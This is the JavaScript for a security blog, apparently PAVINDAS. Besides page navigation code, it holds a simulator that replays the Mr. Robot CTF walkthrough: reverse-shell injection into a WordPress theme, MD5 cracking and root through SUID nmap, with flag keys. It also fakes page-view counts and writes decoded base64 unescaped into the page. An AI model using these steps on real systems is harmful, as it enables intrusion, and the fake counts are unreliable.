/**
 * PAVINDAS — Editorial Blog & Interactive Technical Storytelling Engine
 * Handles timeline navigation, scroll progress, interactive exploit simulators,
 * code copy, evidence lightbox, and filterable listing.
 */

(function () {
    'use strict';

    try {
        const params = new URLSearchParams(window.location.search);
        const scrollY = params.get('scroll');
        if (scrollY) {
            window.scrollTo(0, parseInt(scrollY, 10));
        }
    } catch(e) {}

    document.addEventListener('DOMContentLoaded', () => {
        initScrollProgress();
        initTimelineNavigation();
        initCodeCopy();
        initEvidenceLightbox();
        initAttackChainDemo();
        initCryptoSandbox();
        initCategoryFilter();
        initBackToTop();
        initPageViews();
    });

    /* ===================================================================
       1. READING PROGRESS INDICATOR
       =================================================================== */
    function initScrollProgress() {
        const progressBar = document.getElementById('scroll-progress-bar');
        if (!progressBar) return;

        const updateProgress = () => {
            const scrollTop = window.scrollY || document.documentElement.scrollTop;
            const docHeight = document.documentElement.scrollHeight - window.innerHeight;
            if (docHeight <= 0) return;
            const progress = Math.min(Math.max((scrollTop / docHeight) * 100, 0), 100);
            progressBar.style.width = `${progress}%`;

            // Also update any percentage display on the page
            const percentLabels = document.querySelectorAll('.reading-percent-val');
            percentLabels.forEach(el => {
                el.textContent = `${Math.round(progress)}%`;
            });
        };

        window.addEventListener('scroll', updateProgress, { passive: true });
        updateProgress();
    }

    /* ===================================================================
       2. VERTICAL TIMELINE NAVIGATION & MOBILE DRAWER
       =================================================================== */
    function initTimelineNavigation() {
        const chapters = document.querySelectorAll('.story-chapter');
        const timelineList = document.getElementById('timeline-nav-items');
        const mobileDrawerList = document.getElementById('mobile-drawer-list');
        const mobileCurrentChip = document.getElementById('mobile-current-chapter');
        const timelineGuideProgress = document.querySelector('.timeline-guide-line-progress');
        
        if (!chapters.length) return;

        // Auto-populate desktop timeline and mobile drawer if empty
        if (timelineList && timelineList.children.length === 0) {
            chapters.forEach((chapter, index) => {
                const id = chapter.id;
                const number = chapter.getAttribute('data-number') || String(index + 1).padStart(2, '0');
                const title = chapter.getAttribute('data-title') || chapter.querySelector('h2, .chapter-title')?.textContent || `Chapter ${number}`;

                // Desktop Timeline Item
                const navItem = document.createElement('a');
                navItem.href = `#${id}`;
                navItem.className = 'timeline-nav-item';
                navItem.dataset.target = id;
                navItem.innerHTML = `
                    <span class="timeline-bullet"></span>
                    <span class="timeline-step-num">${number}</span>
                    <span class="timeline-label">${title}</span>
                `;
                timelineList.appendChild(navItem);

                // Mobile Drawer Item
                if (mobileDrawerList) {
                    const drawerItem = document.createElement('a');
                    drawerItem.href = `#${id}`;
                    drawerItem.className = 'mobile-drawer-item';
                    drawerItem.dataset.target = id;
                    drawerItem.innerHTML = `
                        <span class="timeline-step-num" style="color:var(--blog-green);font-weight:600;">${number}</span>
                        <span>${title}</span>
                    `;
                    mobileDrawerList.appendChild(drawerItem);
                }
            });
        }

        const navItems = document.querySelectorAll('.timeline-nav-item');
        const drawerItems = document.querySelectorAll('.mobile-drawer-item');

        // Smooth scrolling with click handler
        const handleNavClick = (e, targetId) => {
            e.preventDefault();
            const targetEl = document.getElementById(targetId);
            if (!targetEl) return;
            
            const offset = 90;
            const bodyRect = document.body.getBoundingClientRect().top;
            const elementRect = targetEl.getBoundingClientRect().top;
            const elementPosition = elementRect - bodyRect;
            const offsetPosition = elementPosition - offset;

            window.scrollTo({
                top: offsetPosition,
                behavior: 'smooth'
            });

            // Close mobile drawer if open
            closeMobileDrawer();
        };

        navItems.forEach(item => {
            item.addEventListener('click', (e) => handleNavClick(e, item.dataset.target));
        });

        drawerItems.forEach(item => {
            item.addEventListener('click', (e) => handleNavClick(e, item.dataset.target));
        });

        // IntersectionObserver for active section tracking
        let activeIndex = 0;
        const observerOptions = {
            root: null,
            rootMargin: '-20% 0px -55% 0px',
            threshold: 0
        };

        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    const activeId = entry.target.id;
                    updateActiveState(activeId);
                }
            });
        }, observerOptions);

        chapters.forEach(ch => observer.observe(ch));

        function updateActiveState(activeId) {
            let foundIndex = 0;
            chapters.forEach((ch, idx) => {
                if (ch.id === activeId) foundIndex = idx;
            });
            activeIndex = foundIndex;

            // Update Desktop items
            navItems.forEach((item, idx) => {
                if (idx < activeIndex) {
                    item.classList.add('completed');
                    item.classList.remove('active');
                } else if (idx === activeIndex) {
                    item.classList.add('active');
                    item.classList.remove('completed');
                } else {
                    item.classList.remove('active', 'completed');
                }
            });

            // Update Story Chapter narrative focus (scroll-driven physics)
            chapters.forEach((ch, idx) => {
                if (idx === activeIndex) {
                    ch.classList.add('active-story-step', 'in-view');
                } else {
                    ch.classList.remove('active-story-step');
                }
            });

            // Update Guide Line progress fill
            if (timelineGuideProgress && navItems.length > 1) {
                const percent = (activeIndex / (navItems.length - 1)) * 100;
                timelineGuideProgress.style.height = `${percent}%`;
            }

            // Update Mobile Drawer items
            drawerItems.forEach((item, idx) => {
                if (idx === activeIndex) {
                    item.classList.add('active');
                } else {
                    item.classList.remove('active');
                }
            });

            // Update Mobile Bottom Bar text
            if (mobileCurrentChip && chapters[activeIndex]) {
                const num = chapters[activeIndex].getAttribute('data-number') || `0${activeIndex + 1}`;
                const title = chapters[activeIndex].getAttribute('data-title') || `Chapter ${num}`;
                mobileCurrentChip.textContent = `${num}. ${title}`;
            }
        }

        // Continuous scroll listener to calculate active chapter with smooth focal physics
        let scrollTicking = false;
        function onWindowScroll() {
            if (!scrollTicking) {
                window.requestAnimationFrame(() => {
                    const viewportH = window.innerHeight;
                    const focalY = viewportH * 0.38;
                    let nearestCh = null;
                    let minDiff = Infinity;

                    chapters.forEach(ch => {
                        const rect = ch.getBoundingClientRect();
                        if (rect.bottom > 80 && rect.top < viewportH) {
                            const diff = Math.abs(rect.top - focalY);
                            if (diff < minDiff) {
                                minDiff = diff;
                                nearestCh = ch;
                            }
                        }
                    });

                    if (nearestCh && nearestCh.id) {
                        updateActiveState(nearestCh.id);
                    }
                    scrollTicking = false;
                });
                scrollTicking = true;
            }
        }
        window.addEventListener('scroll', onWindowScroll, { passive: true });

        // Check for scroll query param (useful for instant position testing)
        try {
            const urlParams = new URLSearchParams(window.location.search);
            const scrollY = urlParams.get('scroll');
            if (scrollY) {
                window.scrollTo(0, parseInt(scrollY, 10));
                onWindowScroll();
            }
        } catch (e) {}

        // Set initial active chapter
        if (chapters.length > 0) {
            updateActiveState(chapters[0].id);
        }

        // Allow clicking an inactive chapter to smoothly bring it into focal view
        chapters.forEach(ch => {
            ch.addEventListener('click', (e) => {
                if (!ch.classList.contains('active-story-step')) {
                    if (!e.target.closest('a, button, input, summary, .code-copy-btn, .evidence-zoom-hint')) {
                        handleNavClick(e, ch.id);
                    }
                }
            });
        });

        // Connect Hero Scroll button to smoothly scroll to first chapter
        const heroScrollBtn = document.querySelector('.hero-scroll-btn');
        if (heroScrollBtn) {
            heroScrollBtn.addEventListener('click', (e) => {
                e.preventDefault();
                const targetId = heroScrollBtn.getAttribute('href')?.replace('#', '') || chapters[0]?.id;
                handleNavClick(e, targetId);
            });
        }

        // Mobile drawer toggles
        const drawer = document.getElementById('mobile-toc-drawer');
        const openBtn = document.getElementById('mobile-toc-open-btn');
        const closeBtn = document.getElementById('mobile-drawer-close-btn');

        if (openBtn && drawer) {
            openBtn.addEventListener('click', () => {
                drawer.classList.add('is-open');
                document.body.style.overflow = 'hidden';
            });
        }

        const closeMobileDrawer = () => {
            if (drawer) {
                drawer.classList.remove('is-open');
                document.body.style.overflow = '';
            }
        };

        if (closeBtn) closeBtn.addEventListener('click', closeMobileDrawer);
        if (drawer) {
            drawer.addEventListener('click', (e) => {
                if (e.target === drawer) closeMobileDrawer();
            });
        }
    }

    /* ===================================================================
       3. CODE & TERMINAL COPY TO CLIPBOARD
       =================================================================== */
    function initCodeCopy() {
        document.querySelectorAll('.code-copy-btn').forEach(button => {
            button.addEventListener('click', () => {
                const targetSelector = button.getAttribute('data-target');
                let textToCopy = '';

                if (targetSelector) {
                    const targetEl = document.querySelector(targetSelector);
                    if (targetEl) textToCopy = targetEl.textContent.trim();
                } else {
                    const block = button.closest('.terminal-block');
                    if (block) {
                        const cmd = block.querySelector('.terminal-cmd');
                        const output = block.querySelector('.terminal-content');
                        textToCopy = (cmd ? cmd.textContent : (output ? output.textContent : '')).trim();
                        // Strip leading prompt symbols ($ , > , # ) if present
                        textToCopy = textToCopy.replace(/^[>$#]\s*/gm, '');
                    }
                }

                if (!textToCopy) return;

                navigator.clipboard.writeText(textToCopy).then(() => {
                    const originalHtml = button.innerHTML;
                    button.classList.add('copied');
                    button.innerHTML = '<i class="fa-solid fa-check"></i> Copied!';
                    setTimeout(() => {
                        button.classList.remove('copied');
                        button.innerHTML = originalHtml;
                    }, 2200);
                }).catch(err => {
                    console.error('Clipboard copy failed:', err);
                });
            });
        });
    }

    /* ===================================================================
       4. EVIDENCE SCREENSHOT LIGHTBOX MODAL (UNIVERSAL & RESILIENT)
       =================================================================== */
    function initEvidenceLightbox() {
        let lightbox = document.getElementById('lightbox-modal');
        if (!lightbox) {
            lightbox = document.createElement('div');
            lightbox.id = 'lightbox-modal';
            lightbox.className = 'lightbox-modal';
            lightbox.setAttribute('role', 'dialog');
            lightbox.setAttribute('aria-modal', 'true');
            lightbox.setAttribute('aria-label', 'Evidence Image Lightbox');
            lightbox.innerHTML = `
                <div class="lightbox-container">
                    <button type="button" class="lightbox-close-btn" aria-label="Close Lightbox"><i class="fa-solid fa-xmark"></i></button>
                    <button type="button" class="lightbox-nav-btn lightbox-prev" aria-label="Previous Image"><i class="fa-solid fa-chevron-left"></i></button>
                    <button type="button" class="lightbox-nav-btn lightbox-next" aria-label="Next Image"><i class="fa-solid fa-chevron-right"></i></button>
                    <img src="" alt="" class="lightbox-img">
                    <div class="lightbox-caption-bar">
                        <div class="lightbox-title"></div>
                        <div class="lightbox-desc"></div>
                    </div>
                </div>
            `;
            document.body.appendChild(lightbox);
        }

        const lightboxImg = lightbox.querySelector('.lightbox-img');
        const lightboxTitle = lightbox.querySelector('.lightbox-title');
        const lightboxDesc = lightbox.querySelector('.lightbox-desc');
        const closeBtn = lightbox.querySelector('.lightbox-close-btn');
        const prevBtn = lightbox.querySelector('.lightbox-prev');
        const nextBtn = lightbox.querySelector('.lightbox-next');

        let currentIdx = -1;

        function getEvidenceCards() {
            return Array.from(document.querySelectorAll('.evidence-card'));
        }

        const openLightbox = (index) => {
            const cards = getEvidenceCards();
            if (index < 0 || index >= cards.length) return;
            currentIdx = index;
            const card = cards[index];
            const img = card.querySelector('.evidence-img, img');
            const badge = card.querySelector('.evidence-badge')?.textContent?.trim() || '';
            const caption = card.querySelector('.evidence-caption')?.textContent?.trim() || '';

            if (img && lightboxImg) {
                lightboxImg.src = img.src;
                lightboxImg.alt = img.alt || badge;
                if (lightboxTitle) lightboxTitle.textContent = badge;
                if (lightboxDesc) lightboxDesc.textContent = caption;
                lightbox.classList.add('is-open');
                document.body.style.overflow = 'hidden';
            }
        };

        const closeLightbox = () => {
            lightbox.classList.remove('is-open');
            document.body.style.overflow = '';
        };

        // Universal click delegation — reliably handles zoom button, image wrapper, and images
        document.addEventListener('click', (e) => {
            const zoomHint = e.target.closest('.evidence-zoom-hint');
            const imgWrap = e.target.closest('.evidence-img-wrap');
            const imgEl = e.target.closest('.evidence-card img, img.evidence-img');

            if (zoomHint || imgWrap || imgEl) {
                e.preventDefault();
                e.stopPropagation();
                const card = e.target.closest('.evidence-card');
                if (card) {
                    const cards = getEvidenceCards();
                    const idx = cards.indexOf(card);
                    if (idx !== -1) {
                        openLightbox(idx);
                        return;
                    }
                }
                // Fallback for standalone images
                const targetImg = e.target.closest('img') || imgWrap?.querySelector('img') || zoomHint?.closest('figure')?.querySelector('img');
                if (targetImg && lightboxImg) {
                    lightboxImg.src = targetImg.src;
                    lightboxImg.alt = targetImg.alt || '';
                    if (lightboxTitle) lightboxTitle.textContent = targetImg.alt || 'Evidence Preview';
                    if (lightboxDesc) lightboxDesc.textContent = '';
                    lightbox.classList.add('is-open');
                    document.body.style.overflow = 'hidden';
                }
            }
        });

        if (closeBtn) closeBtn.addEventListener('click', closeLightbox);
        
        lightbox.addEventListener('click', (e) => {
            if (e.target === lightbox || e.target.classList.contains('lightbox-container')) {
                closeLightbox();
            }
        });

        if (prevBtn) {
            prevBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                const cards = getEvidenceCards();
                if (!cards.length) return;
                if (currentIdx > 0) openLightbox(currentIdx - 1);
                else openLightbox(cards.length - 1);
            });
        }

        if (nextBtn) {
            nextBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                const cards = getEvidenceCards();
                if (!cards.length) return;
                if (currentIdx < cards.length - 1) openLightbox(currentIdx + 1);
                else openLightbox(0);
            });
        }

        document.addEventListener('keydown', (e) => {
            if (!lightbox.classList.contains('is-open')) return;
            if (e.key === 'Escape') closeLightbox();
            if (e.key === 'ArrowLeft' && prevBtn) prevBtn.click();
            if (e.key === 'ArrowRight' && nextBtn) nextBtn.click();
        });
    }

    /* ===================================================================
       PAGE VIEWS SIMULATOR (STATIC GITHUB PAGES COMPATIBLE)
       =================================================================== */
    function initPageViews() {
        const viewsEl = document.getElementById('blog-page-views');
        if (!viewsEl) return;
        
        const path = window.location.pathname;
        let hash = 0;
        for (let i = 0; i < path.length; i++) {
            hash = (hash << 5) - hash + path.charCodeAt(i);
            hash |= 0;
        }
        const baseViews = 1420 + Math.abs(hash % 2450);
        const storageKey = `pv_views_${path}`;
        let currentViews = parseInt(localStorage.getItem(storageKey) || '0', 10);
        if (!currentViews) {
            currentViews = baseViews;
        } else {
            currentViews += 1;
        }
        try {
            localStorage.setItem(storageKey, currentViews);
        } catch (_) {}
        viewsEl.textContent = currentViews.toLocaleString();
    }

    /* ===================================================================
       5. INTERACTIVE ATTACK CHAIN / EXPLOITATION SIMULATOR
       =================================================================== */
    function initAttackChainDemo() {
        const demoContainer = document.getElementById('attack-chain-demo');
        if (!demoContainer) return;

        const chainNodes = demoContainer.querySelectorAll('.chain-step-node');
        const detailLead = demoContainer.querySelector('.demo-detail-lead');
        const payloadInspect = demoContainer.querySelector('.demo-payload-inspect');
        const terminalSim = demoContainer.querySelector('.demo-terminal-sim');
        const actionBtn = demoContainer.querySelector('.demo-btn-action');
        const statusBadge = demoContainer.querySelector('.demo-status-badge');

        const stepData = [
            {
                phase: 'PHASE 01 // RECONNAISSANCE',
                title: 'Information Disclosure via /robots.txt & /license',
                actor: 'Role: Anonymous Attacker',
                target: '192.168.1.41:80',
                payload: 'GET /robots.txt -> fsocity.dic, key-1-of-3.txt\nGET /license -> base64 decode: "elliot:ER28-0652"',
                terminal: [
                    '[*] Scanning target: 192.168.1.41:80...',
                    '[+] Found open endpoint: /robots.txt',
                    '[+] Key 1 Retrieved: 073403c8a58a1f80d943455fb30724b9',
                    '[+] Recovered credential from /license: elliot:ER28-0652'
                ],
                privilege: 'UNAUTHENTICATED'
            },
            {
                phase: 'PHASE 02 // WEAPONIZATION & INITIAL ACCESS',
                title: 'WordPress Theme Editor Reverse Shell Injection',
                actor: 'Role: Authenticated WP Admin (elliot)',
                target: '/wp-admin/theme-editor.php (404.php)',
                payload: 'Injecting PHP pentestmonkey reverse shell into twentyfifteen/404.php\nCatching reverse shell on netcat port 4444',
                terminal: [
                    '[*] Logging in to /wp-login.php as "elliot"... [SUCCESS]',
                    '[*] Injecting payload into twentyfifteen/404.php...',
                    '[*] Triggering non-existent endpoint to execute 404 handler...',
                    '[+] Reverse shell received! Connection from 192.168.1.41:4444',
                    'uid=1 (daemon) gid=1 (daemon) groups=1 (daemon)'
                ],
                privilege: 'USER: DAEMON'
            },
            {
                phase: 'PHASE 03 // LATERAL MOVEMENT',
                title: 'MD5 Hash Cracking & Switching to User "robot"',
                actor: 'Role: Local User (daemon)',
                target: '/home/robot/password.raw-md5',
                payload: 'MD5 Hash: c3fcd3d76192e4007dfb496cca67e13b\nDecrypted: "robot:abcdefghijklmnopqrstuvwxyz"\nCommand: su robot',
                terminal: [
                    'daemon@linux:~$ cd /home/robot && cat password.raw-md5',
                    'robot:c3fcd3d76192e4007dfb496cca67e13b',
                    '[*] Consulting rainbow tables via CrackStation...',
                    '[+] Plaintext recovered: "abcdefghijklmnopqrstuvwxyz"',
                    'daemon@linux:~$ su - robot',
                    'robot@linux:~$ cat key-2-of-3.txt',
                    '[+] Key 2 Retrieved: 822c73956184f694993bede3eb39f959'
                ],
                privilege: 'USER: ROBOT'
            },
            {
                phase: 'PHASE 04 // PRIVILEGE ESCALATION',
                title: 'SUID Nmap Binary Exploitation to Complete Root Takeover',
                actor: 'Role: Target User (robot)',
                target: '/usr/local/bin/nmap (SUID enabled)',
                payload: 'SUID check: find / -perm -u=s -type f\nExploit: nmap --interactive -> !sh',
                terminal: [
                    'robot@linux:~$ find / -perm -u=s -type f 2>/dev/null',
                    '[!] SUID Binary found: /usr/local/bin/nmap',
                    'robot@linux:~$ nmap --interactive',
                    'nmap> !sh',
                    '# whoami',
                    'root (Root Shell Obtained!)',
                    '# cat /root/key-3-of-3.txt',
                    '[+] Key 3 Retrieved: 04787ddef27c3dee1ee161b21670b4e4'
                ],
                privilege: 'ROOT // FULL TAKEOVER'
            }
        ];

        let currentStep = 0;

        const renderStep = (idx) => {
            currentStep = idx;
            chainNodes.forEach((node, i) => {
                if (i === idx) node.classList.add('active');
                else node.classList.remove('active');
            });

            const data = stepData[idx];
            if (detailLead) {
                detailLead.innerHTML = `<strong>${data.title}</strong><br><span style="color:var(--blog-text-muted);font-size:0.85rem;">Actor: ${data.actor} • Target: ${data.target}</span>`;
            }
            if (payloadInspect) {
                payloadInspect.textContent = data.payload;
            }
            if (statusBadge) {
                statusBadge.innerHTML = `<i class="fa-solid fa-shield-halved"></i> Privilege: <strong>${data.privilege}</strong>`;
            }

            if (terminalSim) {
                terminalSim.innerHTML = '';
                data.terminal.forEach((line, i) => {
                    const p = document.createElement('div');
                    p.style.opacity = '0';
                    p.style.transform = 'translateY(4px)';
                    p.style.transition = 'all 0.2s ease';
                    p.textContent = line;
                    terminalSim.appendChild(p);

                    setTimeout(() => {
                        p.style.opacity = '1';
                        p.style.transform = 'translateY(0)';
                    }, i * 150);
                });
            }

            if (actionBtn) {
                if (idx < stepData.length - 1) {
                    actionBtn.innerHTML = `Advance to Phase ${idx + 2} <i class="fa-solid fa-arrow-right"></i>`;
                } else {
                    actionBtn.innerHTML = `<i class="fa-solid fa-rotate-left"></i> Replay Attack Chain`;
                }
            }
        };

        chainNodes.forEach((node, i) => {
            node.addEventListener('click', () => renderStep(i));
        });

        if (actionBtn) {
            actionBtn.addEventListener('click', () => {
                if (currentStep < stepData.length - 1) {
                    renderStep(currentStep + 1);
                } else {
                    renderStep(0);
                }
            });
        }

        renderStep(0);
    }

    /* ===================================================================
       6. INTERACTIVE CRYPTO & HASH DECODING SANDBOX
       =================================================================== */
    function initCryptoSandbox() {
        const sandbox = document.getElementById('crypto-sandbox');
        if (!sandbox) return;

        const tabs = sandbox.querySelectorAll('.sandbox-tab-btn');
        const panes = sandbox.querySelectorAll('.sandbox-pane');

        tabs.forEach(tab => {
            tab.addEventListener('click', () => {
                const target = tab.dataset.tab;
                tabs.forEach(t => t.classList.remove('active'));
                panes.forEach(p => p.classList.remove('active'));

                tab.classList.add('active');
                const activePane = sandbox.querySelector(`.sandbox-pane[data-pane="${target}"]`);
                if (activePane) activePane.classList.add('active');
            });
        });

        // Base64 Decoder Tab
        const b64Input = document.getElementById('b64-input');
        const b64Btn = document.getElementById('b64-decode-btn');
        const b64Result = document.getElementById('b64-result');

        if (b64Btn && b64Input && b64Result) {
            b64Btn.addEventListener('click', () => {
                try {
                    const raw = b64Input.value.trim();
                    const decoded = atob(raw);
                    b64Result.innerHTML = `[SUCCESS] Decoded Plaintext: <strong>${decoded}</strong>`;
                    b64Result.style.color = 'var(--blog-green)';
                } catch (e) {
                    b64Result.textContent = '[ERROR] Invalid Base64 input string.';
                    b64Result.style.color = 'var(--blog-red)';
                }
            });
        }

        // MD5 Cracker Tab
        const md5Input = document.getElementById('md5-input');
        const md5Btn = document.getElementById('md5-crack-btn');
        const md5Result = document.getElementById('md5-result');

        const rainbowTable = {
            'c3fcd3d76192e4007dfb496cca67e13b': 'abcdefghijklmnopqrstuvwxyz',
            '5f4dcc3b5aa765d61d8327deb882cf99': 'password',
            '098f6bcd4621d373cade4e832627b4f6': 'test',
            '21232f297a57a5a743894a0e4a801fc3': 'admin'
        };

        if (md5Btn && md5Input && md5Result) {
            md5Btn.addEventListener('click', () => {
                const hash = md5Input.value.trim().toLowerCase();
                md5Result.textContent = '[*] Querying CrackStation database...';
                md5Result.style.color = 'var(--blog-cyan)';

                setTimeout(() => {
                    if (rainbowTable[hash]) {
                        md5Result.innerHTML = `[MATCH FOUND] Result: <strong>${rainbowTable[hash]}</strong> (Type: md5)`;
                        md5Result.style.color = 'var(--blog-green)';
                    } else {
                        md5Result.textContent = `[NOT FOUND] Hash was not found in common rainbow tables.`;
                        md5Result.style.color = 'var(--blog-amber)';
                    }
                }, 400);
            });
        }
    }

    /* ===================================================================
       7. CATEGORY FILTER (BLOG LISTING PAGE)
       =================================================================== */
    function initCategoryFilter() {
        const filterBtns = document.querySelectorAll('.filter-btn[data-filter]');
        const storyCards = document.querySelectorAll('.story-card[data-category]');

        if (!filterBtns.length || !storyCards.length) return;

        filterBtns.forEach(btn => {
            btn.addEventListener('click', () => {
                const filter = btn.getAttribute('data-filter');

                filterBtns.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');

                storyCards.forEach(card => {
                    const cardCategory = card.getAttribute('data-category');
                    if (filter === 'all' || cardCategory === filter) {
                        card.style.display = 'flex';
                        card.style.opacity = '1';
                        card.style.transform = 'translateY(0)';
                    } else {
                        card.style.display = 'none';
                    }
                });
            });
        });
    }

    /* ===================================================================
       8. BACK TO TOP BUTTON
       =================================================================== */
    function initBackToTop() {
        const backToTopBtns = document.querySelectorAll('.js-back-to-top');
        backToTopBtns.forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.preventDefault();
                window.scrollTo({
                    top: 0,
                    behavior: 'smooth'
                });
            });
        });
    }
})();
